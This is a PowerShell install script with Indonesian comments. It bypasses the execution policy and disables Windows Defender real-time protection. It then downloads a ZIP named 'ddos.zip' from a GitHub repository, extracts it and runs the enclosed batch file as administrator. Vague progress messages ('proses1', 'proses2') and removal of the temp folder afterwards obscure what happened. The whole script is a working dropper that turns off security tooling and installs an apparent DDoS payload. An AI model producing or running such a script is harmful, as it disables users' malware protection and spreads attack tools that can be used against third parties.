# install.ps1

# Izinkan eksekusi skrip
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

# Bypass Windows Defender
if (Get-Command "Set-MpPreference" -ErrorAction SilentlyContinue) {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
}

# Tentukan direktori temp dan file
$TempDir = "$env:TEMP\ntvdm_ddos"
$ZipFile = "$TempDir\ddos.zip"
$ExtractDir = "$TempDir\extracted"
$InstallBat = "$ExtractDir\install.bat"
$SevenZipPath = "C:\Program Files\7-Zip\7z.exe"

# Verifikasi 7-Zip terinstal
if (-not (Test-Path $SevenZipPath)) {
    Write-Host "7-Zip tidak ditemukan di $SevenZipPath" -ForegroundColor Red
    Write-Host "Silakan instal 7-Zip terlebih dahulu: https://www.7-zip.org/ " -ForegroundColor Yellow
    exit
}

# Tambahkan 7-Zip ke PATH sementara
$env:Path = "$env:Path;$SevenZipPath\.."

# Hapus sisa file lama jika ada
if (Test-Path $TempDir) { Remove-Item $TempDir -Recurse -Force }

# Buat folder temp
New-Item -Path $TempDir -ItemType Directory -Force | Out-Null

# Unduh file ZIP
Write-Host "proses1..." -ForegroundColor Green
$URL = "https://github.com/cvs5758/ddos/raw/main/ddos.zip "

try {
    Invoke-WebRequest -Uri $URL -OutFile $ZipFile -ErrorAction Stop
} catch {
    Write-Host "Gagal mengunduh file: $_" -ForegroundColor Red
    exit
}

# Verifikasi apakah file ZIP berhasil diunduh
if (-not (Test-Path $ZipFile)) {
    Write-Host "File ZIP tidak ditemukan di server!" -ForegroundColor Red
    exit
}

# Buat folder ekstraksi
New-Item -Path $ExtractDir -ItemType Directory -Force | Out-Null

# Ekstrak dengan 7-Zip
Write-Host "proses2..." -ForegroundColor Green
$extractProcess = Start-Process -FilePath "7z.exe" `
    -ArgumentList "x `"$ZipFile`" -o`"$ExtractDir`" -y -bse0 -bsp0" `
    -Wait -NoNewWindow -PassThru
if ($extractProcess.ExitCode -ne 0) {
    Write-Host "Gagal mengekstrak file ZIP dengan 7-Zip" -ForegroundColor Red
    exit
}

# Verifikasi apakah install.bat ada
if (-not (Test-Path $InstallBat)) {
    Write-Host "File proses tidak ditemukan setelah ekstraksi!" -ForegroundColor Red
    exit
}

# Jalankan install.bat sebagai admin
Write-Host "proses3.." -ForegroundColor Green
Start-Process powershell -ArgumentList "-Command `"$InstallBat`"" -Verb RunAs -Wait

# Hapus folder sementara
Remove-Item $TempDir -Recurse -Force

Write-Host "Instalasi selesai!" -ForegroundColor Green
